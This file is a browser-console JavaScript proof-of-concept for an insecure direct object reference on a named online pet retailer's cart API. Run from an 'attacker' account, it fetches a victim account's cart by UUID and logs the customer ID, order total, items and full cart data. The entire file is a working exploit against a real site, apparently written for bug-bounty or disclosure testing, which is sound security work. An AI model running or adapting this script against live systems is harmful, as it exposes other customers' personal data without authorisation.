// IDOR Read: Access another user's cart
// Execute in browser console while logged in as Account B (attacker)

const CART_UUID = "6bd223b4-5040-4faa-ba85-6a85c1ec2d50"; // Account A's cart UUID

(async function () {
  console.log("[*] ========================================");
  console.log("[*] IDOR READ: Accessing Account A's Cart");
  console.log("[*] ========================================");
  console.log(`[+] Target Cart UUID: ${CART_UUID}`);
  console.log(`[+] Account B (Attacker) accessing Account A's (Victim) cart`);

  const response = await fetch(
    `https://www.zooplus.de/checkout/api/cart-api/v2/cart/${CART_UUID}`,
    {
      credentials: "include",
    }
  );

  if (response.status === 200) {
    const cart = await response.json();
    console.log("\n[!!!] SUCCESS - Unauthorized access confirmed!");
    console.log(`[+] Cart Owner (customerId): ${cart.customerId || "N/A"}`);
    console.log(`[+] Cart Total: ${cart.summary.grandTotal} EUR`);
    console.log(`[+] Items: ${cart.articles.length}`);
    console.log(
      `[+] Articles:`,
      cart.articles.map((a) => `${a.name} (${a.quantity}x)`)
    );
    console.log("\n[+] Full cart data:", JSON.stringify(cart, null, 2));
    return cart;
  } else {
    console.log(`[!] Failed: HTTP ${response.status}`);
    return null;
  }
})();



